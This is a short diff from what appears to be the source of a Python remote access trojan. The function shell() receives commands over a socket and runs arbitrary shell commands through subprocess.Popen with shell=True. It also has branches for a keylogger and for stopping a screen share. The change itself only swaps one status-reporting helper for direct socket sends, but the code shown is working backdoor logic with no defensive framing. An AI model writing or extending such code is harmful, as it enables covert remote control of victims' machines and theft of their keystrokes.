@@ -863,14 +863,13 @@ def shell():
                     stopscreenshare()
                 elif command[:5] == 'start':
                     try:
-                        reliable_send('[*] Executing')
                         subprocess.Popen(command[6:], shell=True)
 
                     except:
-                        reliable_send('\n [-] Failed \n')
+                        s.send('\n [-] Failed \n'.encode())
                         continue
                     else:
-                        reliable_send('[+] Started')
+                        s.send('[+] Started'.encode())
                 elif command[:12] == 'keylog_start':
                     try:
                         global t
